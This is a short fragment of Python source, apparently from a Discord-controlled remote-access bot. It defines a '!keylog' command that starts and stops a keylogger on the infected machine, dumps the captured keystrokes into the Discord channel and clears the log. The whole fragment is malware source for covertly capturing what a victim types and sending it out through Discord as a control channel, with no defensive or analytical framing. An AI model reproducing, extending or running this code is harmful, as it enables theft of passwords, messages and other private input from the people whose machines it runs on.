# ============================================================
#  KEYLOGGER
# ============================================================
@bot.command(name="keylog")
async def keylog(ctx, action: str = ""):
    try:
        a = action.lower()
        if a == "start":
            open(KEYLOG_ON, "w").write("1")
            _start_keylogger()
            return await ctx.reply("⌨️ keylogger started")
        if a == "stop":
            _stop_keylogger()
            try: os.remove(KEYLOG_ON)
            except: pass
            return await ctx.reply("⌨️ keylogger stopped")
        if a == "dump":
            if not os.path.exists(KEYLOG_FILE):
                return await ctx.reply("(no log yet)")
            data = open(KEYLOG_FILE, "r", encoding="utf-8", errors="ignore").read()
            for c in chunk(data[-8000:] or "(empty)", 1800):
                await ctx.send(f"```\n{c}\n```")
            return
        if a == "clear":
            try: os.remove(KEYLOG_FILE)
            except: pass
            return await ctx.reply("cleared")
        await ctx.reply("usage: `!keylog start|stop|dump|clear`")
    except Exception as e:
        await ctx.reply(f"ERR: {e}")


